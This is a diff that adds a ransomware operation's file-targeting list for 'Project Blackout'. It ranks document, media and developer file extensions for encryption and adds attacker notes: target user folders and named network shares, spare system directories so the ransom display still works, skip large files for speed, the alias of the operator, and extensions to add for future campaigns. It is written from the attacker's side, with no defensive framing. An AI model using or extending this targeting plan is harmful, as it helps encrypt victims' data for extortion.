@@ -1,0 +1,19 @@
+File Extension Target List for Project "Blackout"
+
+Priority 1 Extensions (Document & Data - Encrypt First):
+.txt, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pdf, .odt, .rtf, .csv, .sql, .mdb, .accdb, .xml, .json, .config, .ini, .log
+
+Priority 2 Extensions (Media & Archives - Encrypt if Bandwidth Allows):
+.jpg, .jpeg, .png, .bmp, .gif, .tiff, .mp3, .wav, .mp4, .avi, .mov, .wmv, .zip, .rar, .7z, .tar, .gz
+
+Priority 3 Extensions (Developer & System - Use Caution, May Break Systems):
+.php, .html, .htm, .js, .css, .cpp, .cs, .java, .py, .vb, .asm, .dll, .exe, .sys, .bat, .ps1, .vbs, .bak
+
+Target Notes:
+- Primary focus is user directories and shared network drives (\\FS01\Departments\, \\NAS\Public\).
+- Avoid system32 and program files directories to maintain system stability for ransom display.
+- Maximum file size for encryption: 100MB. Larger files will be skipped to maintain speed.
+- Target extensions list last updated: 2023-10-26 by operator "Cipher".
+- Expected total file count for initial run across all mapped shares: ~15,000 files.
+- Use file extension case-insensitive matching.
+- Add newly observed extensions to this list for future campaigns: .heic, .psd, .indd, .dwg.
